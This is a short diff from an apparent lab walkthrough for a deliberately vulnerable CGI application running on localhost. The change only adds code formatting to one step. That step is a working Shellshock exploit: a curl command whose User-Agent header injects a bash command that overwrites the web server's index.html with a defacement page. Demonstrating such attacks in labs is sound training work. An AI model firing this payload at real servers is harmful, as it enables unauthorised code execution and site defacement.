@@ -52,7 +52,7 @@ http://localhost:8080/cgi-bin/vulnerable`
 
 10. Time to mess with people
 
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I like cats - also you should protect your stuff</h1><body><img src=https://miro.medium.com/max/1200/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
+`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I like cats - also you should protect your stuff</h1><body><img src=https://miro.medium.com/max/1200/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable`
 
 11. Turn on security controls for proccess baselining
 
